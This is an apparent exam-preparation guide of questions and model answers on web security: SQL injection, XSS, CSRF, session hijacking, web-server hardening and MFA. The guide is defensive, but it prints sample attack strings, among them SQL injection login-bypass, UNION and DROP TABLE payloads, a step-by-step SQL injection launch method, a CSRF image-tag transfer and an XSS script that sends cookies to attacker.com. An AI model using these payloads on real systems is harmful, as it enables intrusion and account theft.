2. **Explain the vulnerability of SQL Injection. How can it be prevented?** *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*

Answer:

   The vulnerability
   - SQL injection exists when an application builds a SQL query by concatenating user input directly into the query string. The database cannot tell where the developer's instruction ends and the user's data begins, so specially crafted input becomes executable SQL.

   Classic example — login bypass
   ```sql
   -- Intended query
   SELECT * FROM users WHERE username = '<input>' AND password = '<input>'

   -- Attacker enters username:  ' OR '1'='1' --
   SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
   ```
   - `'1'='1'` is always true and `--` comments out the password check, so the attacker logs in with no password at all.

   Types of SQL injection
   - **Error-based** — deliberately triggers database errors to reveal table and column names.
   - **Union-based** — uses `UNION SELECT` to pull data from other tables into the result set.
   - **Blind boolean-based** — infers data from whether the page behaves differently for true and false conditions.
   - **Blind time-based** — uses `SLEEP()` and measures response time to extract data one bit at a time.

   Impact
   - Authentication bypass, full database disclosure including password hashes and card data, data modification or deletion, privilege escalation, and in some setups OS command execution.

   Prevention
   - **Prepared statements with bound parameters** — the definitive fix:
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
   $stmt->execute([$username, $password]);
   ```
   - **Stored procedures** with parameters, not dynamic SQL inside them.
   - **Whitelist input validation** — restrict to the expected type, length and character set.
   - **Escape any input that genuinely cannot be parameterised**, such as a table name chosen from a fixed allowed list.
   - **Least privilege** for the database account.
   - **Generic error messages** and detailed logging server-side only.
   - **WAF** and regular vulnerability scanning as defence in depth.

3. **What is Cross site script and SQL injection?** *[Islami Bank PLC Quality Assurance (QA) Engineer 14.03.2025 compact it 1333 (ET: BUET)]*

Answer:

   **Cross-Site Scripting (XSS)**
   - Injecting malicious JavaScript into a web page so that it executes in other users' browsers.
   - Three types: stored (saved in the database), reflected (returned in the response to a crafted URL), DOM-based (introduced by client-side JavaScript).
   - Impact: session cookie theft, account takeover, defacement, phishing.
   - Prevention: output encoding, input sanitisation, Content Security Policy, HttpOnly cookies.

   **SQL Injection**
   - Injecting malicious SQL into an input field so the database executes unintended commands.
   - Impact: authentication bypass, full data disclosure, data modification or deletion.
   - Prevention: parameterised queries, stored procedures, input validation, least-privilege database accounts.

   Comparison

   | Point | XSS | SQL Injection |
   |---|---|---|
   | Target | Another USER's browser | The SERVER's database |
   | Injected language | JavaScript / HTML | SQL |
   | Executes on | Client side | Server side |
   | Data at risk | Session cookies, user credentials, page content | The entire database |
   | Main prevention | Output encoding, CSP | Parameterised queries |

   - Both appear in the OWASP Top 10 and both have the same root cause: **untrusted input being treated as code instead of data**.

4. **What is CSRF attack?** *[Islami Bank PLC Quality Assurance (QA) Engineer 14.03.2025 compact it 1333 (ET: BUET)]*

Answer: **CSRF (Cross-Site Request Forgery)** is an attack that tricks a logged-in user's browser into sending an unwanted, authenticated request to a website, so an action is performed without the user's knowledge or consent.

   Why it works
   - Browsers automatically attach the session cookie to every request to a site, regardless of which page triggered the request.
   - The server sees a valid session cookie and cannot tell that the user did not intend the action.

   How the attack proceeds
   ```mermaid
   flowchart LR
       U[User logged into bank.com] --> A[Visits attacker's page]
       A -->|hidden form auto-submits| B[bank.com/transfer]
       B -->|browser attaches session cookie| S[Bank server]
       S -->|sees valid session — executes transfer| X[Money transferred]
   ```

   Example
   ```html
   <!-- On the attacker's page -->
   <img src="https://bank.com/transfer?to=attacker&amount=50000">
   ```
   - Merely loading the attacker's page causes the victim's browser to send the transfer request with the victim's cookie attached.

   Prevention
   - **CSRF token (synchroniser token)** — the server embeds a random, unpredictable token in every form. A forged request from another site cannot know it. This is the primary defence.
   - **SameSite cookie attribute** — `SameSite=Strict` sends the cookie only for requests originating from the same site; `SameSite=Lax` allows it for top-level navigation only. This blocks most CSRF automatically.
   - **Verify the Origin and Referer headers**.
   - **Re-authentication or OTP** for sensitive actions such as fund transfer.
   - **Use POST, not GET, for state-changing actions** — a GET can be triggered by a simple `<img>` tag.
   - **Double-submit cookie pattern** where a token cannot be stored server-side.

   - Note: an XSS vulnerability defeats all CSRF protection, because injected script runs on the site itself and can simply read the token. XSS must be fixed first.

5. **What is CSRF and XSS?** *[DESCO Sub-Assistant Engineer 20.06.2025 compact it 1361 (ET: BUET)]*

Answer:

   **XSS (Cross-Site Scripting)**
   - Injecting malicious script into a web page so it runs in another user's browser.
   - The attacker STEALS data or hijacks the session by running code as the victim.
   - Types: stored, reflected, DOM-based.
   - Prevention: output encoding, input sanitisation, Content Security Policy, HttpOnly cookies.

   **CSRF (Cross-Site Request Forgery)**
   - Tricking a logged-in user's browser into performing an unwanted action on a site where they are authenticated.
   - The attacker does not steal anything — they cause the victim to ACT.
   - Prevention: CSRF tokens, SameSite cookies, Origin/Referer checking, re-authentication for sensitive operations.

   Key differences

   | Point | XSS | CSRF |
   |---|---|---|
   | What the attacker does | Runs their own script on the site | Makes the victim send a legitimate-looking request |
   | Requires the victim to be logged in | Not necessarily | Yes, essential |
   | Attacker sees the response | Yes | No — it is a blind, one-way attack |
   | Root cause | Untrusted input rendered as code | Server trusting the session cookie alone |
   | Main defence | Output encoding + CSP | CSRF token + SameSite cookie |
   | Scope of damage | Read AND write as the victim | Write only |

   - Relationship: XSS is the more severe of the two, because a successful XSS attack can bypass every CSRF defence by reading the token directly from the page.

6. **What is SQL Injection? How to Prevent against SQL Injection Attacks?** *[RAKUB Programmer (PO) 12.10.2021 compact it 853-854 (ET: N/A)], [RAKUB Maintenance Engineer (PO) 05.10.2021 compact it 857 (ET: N/A)], [Dhaka WASA Assistant Maintenance Engineer (Network) 04.07.2025 compact it 1439 (ET: BUET)]*

Answer: SQL injection is a web attack in which malicious SQL statements are inserted into an application's input fields and executed by the backend database, allowing an attacker to view, modify or delete data they should not be able to reach.

   Root cause
   - User input concatenated directly into a SQL string, so the database cannot distinguish the developer's command from the attacker's data.

   Example
   ```sql
   -- Vulnerable
   "SELECT * FROM users WHERE id = " + userInput

   -- Attacker input:  1; DROP TABLE users; --
   SELECT * FROM users WHERE id = 1; DROP TABLE users; --
   ```

   Prevention techniques

   **1. Prepared statements / parameterised queries — the primary defence**
   ```java
   PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
   ps.setInt(1, userId);
   ```
   - The SQL structure is fixed before the input is supplied, so input can never change the query's meaning.

   **2. Stored procedures** with parameters, avoiding dynamic SQL inside the procedure body.

   **3. Input validation (whitelisting)** — enforce type, length, format and allowed character set. Reject rather than sanitise where possible.

   **4. Escaping special characters** — only where parameterisation is genuinely impossible, and using the database driver's own escaping function.

   **5. Principle of least privilege** — the application's database account should have only the permissions it needs, never DROP or administrative rights.

   **6. Generic error messages** — never expose SQL errors, table names or stack traces to the user.

   **7. ORM frameworks** — Hibernate, Entity Framework and Django ORM generate parameterised queries by default.

   **8. Web Application Firewall** — blocks known injection patterns as an additional layer.

   **9. Regular security testing** — automated scanning and manual penetration testing, plus code review focused on query construction.

   - The single most important point: **validation and escaping are secondary. Parameterised queries are the real fix**, because they remove the possibility of input being interpreted as code at all.

7. **(b) Explain XSS and CSRF (how do you prevent these attacks).** *[Titas Gas Assistant Engineer (CSE) 24.05.2024 compact it 415 (ET: BUET)]*

Answer:

   **(a) XSS — Cross-Site Scripting**
   - The attacker injects malicious JavaScript into a web page; when another user loads the page, the script runs in their browser with their session.

   Types
   - **Stored XSS** — the script is saved on the server (in a comment, profile field or forum post) and served to every visitor. The most dangerous.
   - **Reflected XSS** — the script travels in a crafted URL and is echoed back in the response. Requires the victim to click the link.
   - **DOM-based XSS** — client-side JavaScript writes untrusted data into the DOM without sanitising it.

   Prevention
   - **Output encoding** — encode data for the context it appears in (HTML body, attribute, JavaScript, URL). This is the primary fix.
   - **Input sanitisation** with a maintained library such as DOMPurify; never write your own filter.
   - **Content Security Policy (CSP)** — instruct the browser to run scripts only from approved sources, which blocks injected inline script.
   - **HttpOnly cookies** — prevents JavaScript from reading the session cookie.
   - Avoid `innerHTML`, `document.write()` and `eval()`; use `textContent`.
   - Use a framework with automatic escaping (React, Angular escape by default).

   **(b) CSRF — Cross-Site Request Forgery**
   - The attacker causes a logged-in victim's browser to submit an unwanted authenticated request, performing an action the victim never intended.

   Prevention
   - **CSRF token** — a random unpredictable value embedded in every state-changing form and verified server-side. An off-site attacker cannot guess it.
   - **SameSite cookie attribute** — `Strict` or `Lax` stops the browser attaching the session cookie to cross-site requests.
   - **Check the Origin and Referer headers** on state-changing requests.
   - **Require re-authentication or an OTP** for high-value operations such as fund transfers or password changes.
   - **Never use GET for actions that change state**, since a GET can be triggered by an image tag.

   - Ordering note: fix XSS FIRST. While an XSS hole exists, CSRF tokens provide no protection, because injected script can read the token straight from the page.

8. **Your bank wants to secure an e-banking online system and wants to configure a web server in your data center. What kind of tools and technology do you use for this?** *[Combined Bank Assistant Maintenance Engineer/ Assistant Engineer (IT) 24.02.2024 compact it 309 (ET: BIBM)]*

Answer: A layered set of tools and technologies is needed, organised by where each control sits.

   (a) Network perimeter
   - **Next-Generation Firewall** (Palo Alto, FortiGate, Cisco Firepower) with integrated IPS.
   - **DMZ architecture** with dual firewalls — the web server in the DMZ, the database on the internal network.
   - **DDoS protection** — an on-premises appliance plus an upstream scrubbing service or CDN.
   - **Load balancer** (F5, HAProxy, Nginx) for availability and SSL offloading.

   (b) Web and application layer
   - **Web Application Firewall** (F5 ASM, Imperva, ModSecurity, Cloudflare WAF) with OWASP Top 10 rule sets.
   - **Reverse proxy** so the real application server is never directly exposed.
   - **Web server** — Apache or Nginx or IIS, hardened: unnecessary modules removed, directory listing disabled, server version banner suppressed.
   - **TLS 1.2/1.3** with a certificate from a trusted CA, strong cipher suites, HSTS, and TLS 1.0/1.1 and weak ciphers disabled.

   (c) Authentication and access
   - **Multi-factor authentication** — OTP by SMS or an authenticator app, plus device binding.
   - **Strong session management** — Secure, HttpOnly, SameSite cookies, short timeouts, session regeneration on login.
   - **Role-based access control** and least privilege.
   - **Privileged Access Management** with session recording for administrators.

   (d) Data protection
   - **Encryption at rest** — TDE for the database, encrypted backups.
   - **HSM (Hardware Security Module)** for key storage and PIN operations.
   - **Tokenisation** of card data so the application never stores the PAN.
   - **Data masking** in test environments.

   (e) Monitoring and detection
   - **SIEM** (Splunk, QRadar, Wazuh) collecting logs from every layer.
   - **IDS/IPS** on a mirror port.
   - **EDR** on all servers.
   - **File Integrity Monitoring** to detect unauthorised changes to web content.
   - **24/7 SOC**.

   (f) Development and testing
   - **Secure SDLC** with code review and secure coding standards.
   - **SAST and DAST** tools (SonarQube, Fortify, Burp Suite, OWASP ZAP).
   - **Dependency scanning** for vulnerable libraries.
   - **Regular VAPT** by an independent third party.

   (g) Availability and continuity
   - **High availability cluster**, **DR site** in a separate seismic zone, tested backups, and defined RTO/RPO.

   (h) Compliance
   - **Bangladesh Bank ICT Security Guideline**, **PCI DSS** for card data, and ISO 27001 as the governing framework.

9. **What is SQL Injection attack? How it launched?** *[Sylhet Gas Field Limited (SGFL) Assistant Engineer (IT) 2023 compact it 588 (ET: BUET)]*

Answer: SQL injection is an attack in which malicious SQL is inserted into an application's input, causing the database to execute commands the developer never intended.

   How it is launched — the attacker's process

   **Step 1 — Find an injection point**
   - Test every input that reaches the database: login forms, search boxes, URL parameters, cookies, HTTP headers.
   - Enter a single quote `'`. If the application returns a database error, the input is reaching the query unescaped.

   **Step 2 — Confirm the vulnerability**
   - Try a boolean test: `1' AND '1'='1` (page loads normally) versus `1' AND '1'='2` (page differs). A difference confirms injection.

   **Step 3 — Determine the query structure**
   - Use `ORDER BY 1`, `ORDER BY 2`, ... until an error appears, revealing the number of columns.

   **Step 4 — Extract data**
   - **Union-based**: `' UNION SELECT username, password FROM users --`
   - **Error-based**: force errors that print table and column names.
   - **Blind boolean**: infer one character at a time from whether the page changes.
   - **Blind time-based**: `' AND IF(1=1, SLEEP(5), 0) --` and measure the delay.

   **Step 5 — Escalate**
   - Read system tables to map the whole schema, extract password hashes, modify or delete records, or attempt OS command execution through features such as `xp_cmdshell`.

   Automated tools
   - **sqlmap** performs all of the above automatically, which is why even an unskilled attacker can exploit the vulnerability.

   Prevention
   - Parameterised queries, stored procedures, whitelist validation, least-privilege database accounts, generic error messages, and a WAF.

10. **Write the difference types of Web application attacks?** *[Ministry of Land Assistant Maintenance Engineer 2023 compact it 595 (ET: N/A)]*

Answer: The standard reference is the **OWASP Top 10**. The main web application attacks:

    **Injection attacks**
    - **SQL Injection** — malicious SQL executed by the database.
    - **Command Injection** — OS commands executed on the server.
    - **LDAP / XML / NoSQL injection** — the same idea against other interpreters.

    **Client-side attacks**
    - **Cross-Site Scripting (XSS)** — script runs in another user's browser. Stored, reflected and DOM-based.
    - **Cross-Site Request Forgery (CSRF)** — victim's browser is made to send an unwanted authenticated request.
    - **Clickjacking** — an invisible frame captures the victim's clicks.

    **Authentication and session attacks**
    - **Broken authentication** — weak password policy, no lockout, predictable session IDs.
    - **Session hijacking** — stealing a session cookie to impersonate a user.
    - **Session fixation** — forcing a known session ID on the victim.
    - **Credential stuffing and brute force**.

    **Access control attacks**
    - **Insecure Direct Object Reference (IDOR)** — changing `id=101` to `id=102` to read another user's record.
    - **Privilege escalation** — a normal user gaining administrative rights.
    - **Directory traversal** — `../../etc/passwd` to read files outside the web root.

    **Configuration and design flaws**
    - **Security misconfiguration** — default credentials, directory listing enabled, verbose errors.
    - **Sensitive data exposure** — data sent or stored unencrypted.
    - **Vulnerable and outdated components** — an unpatched library in the dependency tree.
    - **Server-Side Request Forgery (SSRF)** — the server is made to fetch a URL of the attacker's choosing.
    - **File upload vulnerability** — uploading a web shell.

    **Availability attacks**
    - **DoS / DDoS** against the application layer, and **resource exhaustion** through expensive queries.

    - Common root cause across most of them: **trusting input, or trusting the client**. Every one of these is prevented by validating on the server and never assuming the request came from your own page.

11. **Write two differences between SQL Injection and cross site scripting (XSS).** *[BICIC Assistant Programmer 2022 compact it 630 (ET: BUET)]*

Answer: Two key differences:

    **1. Target and execution location**
    - **SQL injection** targets the SERVER's database. The malicious code executes on the server, inside the database engine.
    - **XSS** targets ANOTHER USER's browser. The malicious code executes on the client side, in the victim's browser.

    **2. Language injected and what is compromised**
    - **SQL injection** injects SQL, and compromises the DATA — the attacker can read, modify or delete the entire database.
    - **XSS** injects JavaScript or HTML, and compromises the USER — the attacker steals session cookies, credentials and acts as that user.

    Fuller comparison

    | Point | SQL Injection | XSS |
    |---|---|---|
    | Injected language | SQL | JavaScript / HTML |
    | Executes on | Server (database) | Client (victim's browser) |
    | Victim | The application and its data | Another user of the application |
    | Data at risk | Entire database | Session cookies, user data on the page |
    | Main prevention | Parameterised queries | Output encoding and CSP |
    | Severity | Usually critical — total data loss | High — account takeover |

    - Shared root cause: both arise from **untrusted input being interpreted as code rather than data**. The fix in both cases is to keep data and code strictly separate — parameterisation for SQL, encoding for HTML.

12. **What is SQL injection? How to prevent it?** *[SPCB Sub-Assistant Programmer 2022 compact it 738 (ET: N/A)]*

Answer: SQL injection is a vulnerability where an attacker inserts malicious SQL through a user input field, causing the database to run unintended commands. It occurs whenever user input is concatenated directly into a SQL query.

    Example
    ```sql
    -- Vulnerable login query
    SELECT * FROM users WHERE username='$user' AND password='$pass'

    -- Attacker enters username:  admin' --
    SELECT * FROM users WHERE username='admin' --' AND password=''
    ```
    - The `--` comments out the password check, so the attacker logs in as admin without a password.

    Prevention
    - **Prepared statements with bound parameters** — the definitive fix. Query structure is fixed before input arrives, so input can never alter it.
    - **Stored procedures** using parameters.
    - **Whitelist input validation** — accept only the expected type, length and characters.
    - **Least-privilege database account** — no DROP, no administrative rights, and only the tables the application needs.
    - **Escape input** only where parameterisation is impossible, using the driver's own escape function.
    - **Generic error messages** so database internals are never disclosed.
    - **ORM frameworks** that parameterise automatically.
    - **Web Application Firewall** and regular penetration testing as additional layers.

    - The order matters: parameterised queries first, everything else as defence in depth. Validation and WAF alone are not sufficient, because attackers routinely bypass filters.

13. **What is Cross site script XSS and how can fix it?** *[SPCB Sub-Assistant Programmer 2022 compact it 738 (ET: N/A)]*

Answer: XSS is a vulnerability that lets an attacker inject malicious script into a web page, which then executes in the browsers of other users who view that page, running with those users' privileges and session.

    Types
    - **Stored (persistent)** — the script is saved on the server, in a comment, profile or forum post, and served to every visitor. Most dangerous.
    - **Reflected (non-persistent)** — the script is included in a crafted URL and echoed back in the response. The victim must click the link.
    - **DOM-based** — client-side JavaScript inserts untrusted data into the DOM without sanitising it; the server never sees the payload.

    Example
    ```html
    <script>fetch('http://attacker.com/?c=' + document.cookie)</script>
    ```
    - Posted as a comment, this sends every reader's session cookie to the attacker.

    How to fix it

    **1. Output encoding — the primary fix**
    - Encode all untrusted data for the context in which it appears. In HTML, `<` becomes `&lt;` and `>` becomes `&gt;`, so the browser DISPLAYS the text instead of executing it.
    - Different contexts need different encoding: HTML body, HTML attribute, JavaScript, CSS and URL each have their own rules.

    **2. Input validation and sanitisation**
    - Whitelist what is allowed. For rich text, use a maintained sanitiser such as DOMPurify — never write your own filter.

    **3. Content Security Policy (CSP)**
    - An HTTP header telling the browser to execute scripts only from approved sources, which blocks injected inline script even if it gets through.

    **4. HttpOnly and Secure cookies**
    - `HttpOnly` prevents JavaScript from reading the session cookie, so even a successful XSS cannot steal the session.

    **5. Safe DOM APIs**
    - Use `textContent` instead of `innerHTML`; avoid `eval()` and `document.write()`.

    **6. Use a framework with automatic escaping**
    - React, Angular and Vue escape output by default. Disabling that (`dangerouslySetInnerHTML`) is where XSS usually re-enters.

    - Golden rule: **never trust input, always encode output** — and encode according to where the data will actually be placed.

14. **Write down the counter measure of SQL injection attack.** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 753 (ET: N/A)]*

Answer: Countermeasures in order of effectiveness.

    **1. Parameterised queries / prepared statements — the primary countermeasure**
    ```java
    PreparedStatement ps = conn.prepareStatement(
        "SELECT * FROM accounts WHERE acc_no = ? AND pin = ?");
    ps.setString(1, accNo);
    ps.setString(2, pin);
    ```
    - The query structure is compiled before the data arrives, so input can never change its meaning. This eliminates the vulnerability rather than filtering it.

    **2. Stored procedures**
    - Predefined queries with parameters, provided the procedure itself does not build dynamic SQL internally.

    **3. Input validation (whitelisting)**
    - Enforce expected data type, length, format and character set. Reject invalid input rather than trying to clean it.

    **4. Principle of least privilege**
    - The application's database account should have only SELECT, INSERT and UPDATE on the tables it needs — never DROP, never DBA rights. This limits the damage even if injection succeeds.

    **5. Escaping special characters**
    - Only where parameterisation is genuinely impossible, using the database driver's own escaping function.

    **6. Error handling**
    - Show generic messages to users; log full details server-side. Detailed SQL errors are a roadmap for the attacker.

    **7. Web Application Firewall**
    - Blocks known injection patterns. A useful layer, but not a substitute for fixing the code.

    **8. Use an ORM**
    - Hibernate, Entity Framework and Django ORM generate parameterised queries by default.

    **9. Regular testing**
    - Automated scanning (sqlmap, OWASP ZAP), manual penetration testing, and code review focused on how queries are constructed.

    **10. Keep the database and drivers patched**, disable dangerous features such as `xp_cmdshell`, and monitor query logs for anomalies.

15. **What is SQL Injection? How can we protect web Application from SQL Injection attack?** *[SPCBL Assistant Maintenance Engineer 20.11.2021 compact it 874 (ET: N/A)]*

Answer: SQL injection is a web application vulnerability in which an attacker submits crafted input containing SQL syntax, which the application concatenates into a query, causing the database to execute the attacker's commands.

    What an attacker can achieve
    - Bypass login without a password, read the entire database including password hashes, modify or delete records, escalate privileges, and in poorly configured systems execute operating system commands.

    How to protect a web application

    **(a) Code level — the real fix**
    - Use **prepared statements with bound parameters** everywhere. There should be no string concatenation of user input into SQL anywhere in the codebase.
    - Use **stored procedures** with parameters.
    - Use an **ORM** that parameterises by default.
    - Apply **whitelist input validation** on type, length and format.

    **(b) Database level**
    - **Least privilege** for the application account — no DDL rights, no administrative rights.
    - Separate accounts for read and write operations.
    - Disable dangerous stored procedures such as `xp_cmdshell`.
    - Keep the database engine patched.

    **(c) Application configuration**
    - **Generic error pages** — never expose SQL errors or stack traces.
    - Disable verbose debugging in production.
    - Encrypt sensitive columns so stolen data is less useful.

    **(d) Perimeter and monitoring**
    - **Web Application Firewall** with injection rule sets.
    - **Database activity monitoring** to alert on unusual query patterns.
    - Centralised logging into a SIEM.

    **(e) Process**
    - Secure coding standards and mandatory code review.
    - **SAST and DAST** in the build pipeline.
    - Regular independent **VAPT**.
    - Developer training — this vulnerability persists because developers keep writing concatenated queries.

    - Summary: SQL injection is completely preventable at the code level. Every other control is damage limitation for the cases the code missed.

16. **What is SQL injection? How many ways to prevent it?** *[Bangladesh Television Assistant Programmer 2019 compact it 1064 (ET: N/A)]*

Answer: SQL injection is a code injection attack in which malicious SQL statements are inserted into an application's input fields and then executed by the backend database, allowing unauthorised access to or manipulation of data.

    Ways to prevent it — eight main methods

    **1. Prepared statements (parameterised queries)** — the most effective. The SQL structure is fixed before user data is bound, so input can never be interpreted as code.

    **2. Stored procedures** — predefined queries taking parameters, provided no dynamic SQL is built inside them.

    **3. Input validation (whitelisting)** — accept only the expected data type, length, format and character set; reject everything else.

    **4. Escaping user input** — using the database driver's own escape function, for the rare case where parameterisation is impossible.

    **5. Least privilege** — the application's database account should hold only the minimum rights, never DROP or DBA privileges.

    **6. Proper error handling** — generic messages to the user, full details logged server-side only.

    **7. ORM frameworks** — Hibernate, Entity Framework, Django ORM and similar generate parameterised SQL automatically.

    **8. Web Application Firewall and regular testing** — a WAF blocks known injection patterns, and VAPT plus automated scanning finds what code review missed.

    - Additional supporting measures: keep the database patched, disable dangerous features such as `xp_cmdshell`, encrypt sensitive columns, and monitor database activity for anomalous queries.
    - The essential point: methods 1 and 2 eliminate the vulnerability; the rest reduce the damage if it slips through.

17. **(খ) Cross Site Scripting (XSS) বলতে কী বোঝায়? এর হাত থেকে রক্ষা পাওয়ার পদ্ধতিগুলো লিখুন।** *[16th NTRCA Lecturer (ICT) (ICT): 2019 compact it 1090 (ET: N/A)]*

Answer:

    (a) What XSS means
    - Cross-Site Scripting is a web vulnerability in which an attacker injects malicious script (usually JavaScript) into a web page. When another user loads that page, the script executes in THEIR browser, with their session and their privileges.
    - The application is the delivery vehicle; the victim is another user of the site.

    Types
    - **Stored XSS** — the payload is saved on the server and served to everyone who views the page.
    - **Reflected XSS** — the payload is in a crafted URL and echoed back in the response.
    - **DOM-based XSS** — client-side JavaScript writes untrusted data into the page.

    What an attacker gains
    - Session cookie theft leading to account takeover, keylogging, defacement, redirecting users to phishing sites, and performing actions as the victim.

    (b) Protection methods

    - **Output encoding** — the primary defence. Encode every piece of untrusted data before rendering it, according to its context (HTML body, attribute, JavaScript, URL). `<script>` becomes `&lt;script&gt;` and is displayed rather than executed.
    - **Input validation and sanitisation** — whitelist acceptable input; for rich text use a maintained sanitiser such as DOMPurify rather than a hand-written filter.
    - **Content Security Policy (CSP)** — an HTTP header restricting which script sources the browser may execute, which neutralises injected inline script.
    - **HttpOnly cookie flag** — JavaScript cannot read the session cookie, so even successful XSS cannot steal the session.
    - **Secure and SameSite cookie flags** for additional protection.
    - **Avoid dangerous DOM APIs** — use `textContent` instead of `innerHTML`; never use `eval()`.
    - **Use a framework with automatic escaping** — React, Angular and Vue escape by default.
    - **X-XSS-Protection and X-Content-Type-Options headers** as legacy browser hardening.
    - **Regular security testing** — SAST, DAST and penetration testing.
    - **Developer training** on the rule: never trust input, always encode output.

18. **What is session hijacking and how to encrypt username and password in PHP?** *[Bangladesh Bank Assistant Maintenance Engineer 2017 compact it 1227-1228 (ET: N/A)]*

Answer:

    (a) Session hijacking
    - An attack in which the attacker takes over an already authenticated session by stealing or predicting the session identifier. No password is needed — possessing the session token IS being the user, as far as the server is concerned.

    How the session ID is obtained
    - **Packet sniffing** on an unencrypted connection.
    - **XSS** reading `document.cookie`.
    - **Session fixation** — forcing a known session ID on the victim before they log in.
    - **Predictable session IDs** generated by a weak algorithm.
    - **Man-in-the-middle** interception.

    Prevention
    - **HTTPS everywhere**, so the cookie can never be sniffed.
    - **HttpOnly, Secure and SameSite** cookie flags.
    - **Regenerate the session ID on login** (`session_regenerate_id(true)`), which defeats session fixation.
    - **Long, cryptographically random session IDs**.
    - **Short idle timeouts** and re-authentication for sensitive actions.
    - Optionally bind the session to the client IP or user agent.

    (b) Handling username and password in PHP

    **Passwords must be HASHED, not encrypted.** Encryption is reversible; if the database is stolen along with the key, every password is exposed. Hashing is one-way.

    ```php
    // Registration — hash the password
    $hash = password_hash($password, PASSWORD_DEFAULT);
    // PASSWORD_DEFAULT currently uses bcrypt, and includes a random salt automatically

    // Store $hash in the database (60+ characters)

    // Login — verify
    if (password_verify($enteredPassword, $storedHash)) {
        session_regenerate_id(true);
        $_SESSION['user'] = $username;
        // login successful
    }
    ```

    Why `password_hash()` and not `md5()` or `sha1()`
    - MD5 and SHA-1 are fast, which makes brute-forcing billions of guesses per second feasible on a GPU. They are also broken for collision resistance.
    - `password_hash()` uses **bcrypt** (or Argon2), which is deliberately SLOW and includes a random **salt** per password, so identical passwords produce different hashes and rainbow tables are useless.

    Protecting the credentials in transit
    - **Always use HTTPS/TLS.** Encrypting the password in JavaScript before sending is not a substitute — an attacker who can read the traffic can also read or replace the script.

19. **What are the important steps to secure a web server?** *[Bangladesh Bank Assistant Maintenance Engineer 2017 compact it 1228 (ET: N/A)]*

Answer:

    (a) Operating system hardening
    - Install only what is needed; remove unnecessary packages and services.
    - Apply **security patches promptly** — unpatched servers are the most common breach cause.
    - Disable unused ports and protocols.
    - Rename or disable default accounts; remove guest accounts.
    - Enforce a strong password policy and use SSH keys rather than passwords.

    (b) Web server configuration
    - Run the web server as a **non-privileged user**, never as root or Administrator.
    - **Disable directory listing** and remove default sample pages and applications.
    - **Hide the version banner** (`ServerTokens Prod`, `ServerSignature Off`), so version-specific exploits cannot be targeted easily.
    - Disable unnecessary modules and HTTP methods (TRACE, PUT, DELETE).
    - Set correct file and directory permissions; the web root should not be writable by the web server process.
    - Configure **security headers**: HSTS, CSP, X-Frame-Options, X-Content-Type-Options.

    (c) Encryption
    - **TLS 1.2/1.3 only**, with a certificate from a trusted CA.
    - Disable SSLv3, TLS 1.0 and 1.1, and weak ciphers.
    - Redirect all HTTP to HTTPS, and enable **HSTS**.

    (d) Network protection
    - Place the server in a **DMZ**, never on the internal LAN.
    - **Firewall** allowing only ports 80 and 443 inbound.
    - **WAF** in front of the application.
    - **DDoS protection** and rate limiting.
    - Restrict administrative access to a management VLAN or through a VPN and bastion host.

    (e) Application security
    - Secure coding practices, input validation, parameterised queries, output encoding.
    - Regular **VAPT** and dependency scanning for vulnerable libraries.
    - Remove test files, backup files and source control directories (`.git`) from the web root.

    (f) Access control
    - Least privilege, role-based access, **MFA for administrative logins**, and disabling of unused accounts.

    (g) Monitoring, logging and backup
    - Centralised logging to a SIEM, **File Integrity Monitoring** on web content, IDS/IPS, and alerting.
    - **Regular backups** stored off-server, with tested restores.
    - Documented incident response plan.

    (h) Physical and operational
    - Secure data centre access, redundant power and cooling, and change management for every configuration change.

    - Underlying principle: **defence in depth plus default deny** — remove everything not needed, permit only what is required, and monitor everything that remains.

## Authentication & Access Control (16)

1. **Multi-Factor Authentication (MFA) is mandatory in modern banking infrastructure. (a) Define the concept of MFA and explicitly list the three globally recognized categories of authentication factors.** *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*

Answer:

   (a) Definition of MFA
   - Multi-Factor Authentication requires a user to present **two or more independent credentials from DIFFERENT categories** before access is granted.
   - The point is independence: compromising one factor must not compromise the other. Two passwords are not MFA, because both come from the same category.

   (b) The three globally recognised categories

   **1. Something you KNOW (knowledge factor)**
   - Password, PIN, security question answer, passphrase.
   - Weakness: can be guessed, phished, shoulder-surfed or reused across sites.

   **2. Something you HAVE (possession factor)**
   - Mobile phone receiving an OTP, hardware token, smart card, security key (YubiKey), authenticator app generating a TOTP.
   - Weakness: can be lost, stolen, or in the case of SMS, intercepted by SIM swap.

   **3. Something you ARE (inherence factor)**
   - Fingerprint, face recognition, iris scan, voice pattern, retina scan.
   - Weakness: cannot be changed if compromised, and can produce false accept/reject errors.

   Two further factors sometimes listed
   - **Somewhere you are** (location) — GPS or IP geolocation, used for risk-based authentication.
   - **Something you do** (behaviour) — typing rhythm, gait, signature dynamics.

   Why MFA is mandatory in banking
   - Passwords alone fail constantly through phishing, reuse and breach. MFA means a stolen password is not sufficient to take over an account.
   - Bangladesh Bank's ICT Security Guideline and PCI DSS both require it for administrative and remote access.
   - Typical banking implementation: password (know) + OTP to registered mobile (have), with fingerprint (are) for app login.

2. **টু-ফ্যাক্টর অথেনটিকেশন এবং ডিজিটাল সিগনেচার দিয়ে ডেটার সুরক্ষা কীভাবে করা হয়?** *[Assistant Programmer - Department of Immigration & Passports 15.07.2026 compact it 1464 (ET: N/A)]*

Answer:

   (a) How Two-Factor Authentication protects data
   - It protects **ACCESS** to data by requiring two independent proofs of identity from different categories.
   - Even if an attacker steals the password through phishing or a breach, they still lack the second factor — the physical phone or the fingerprint — so they cannot log in.
   - It defeats the most common attack chain entirely: credential theft followed by account takeover.
   - In banking it also protects individual TRANSACTIONS, since an OTP is required per transfer, not just at login.

   Example
   - A customer logs in with a password (something they know), then enters an OTP sent to their registered mobile (something they have). A stolen password alone achieves nothing.

   (b) How Digital Signature protects data
   - It protects the **DATA ITSELF**, providing three guarantees:
   - **Integrity** — the document hash is signed, so any alteration, even a single character, breaks the verification.
   - **Authentication** — only the holder of the private key could have produced the signature, proving who sent it.
   - **Non-repudiation** — the signer cannot later deny signing, because nobody else holds that private key.

   How it works
   - Sign: `Signature = Encrypt(Hash(document), sender's private key)`
   - Verify: decrypt the signature with the sender's public key, independently hash the received document, and compare.

   (c) How they complement each other
   - **2FA answers "who is accessing?"** — it controls entry.
   - **Digital signature answers "is this data genuine and unaltered?"** — it protects the content and its origin.
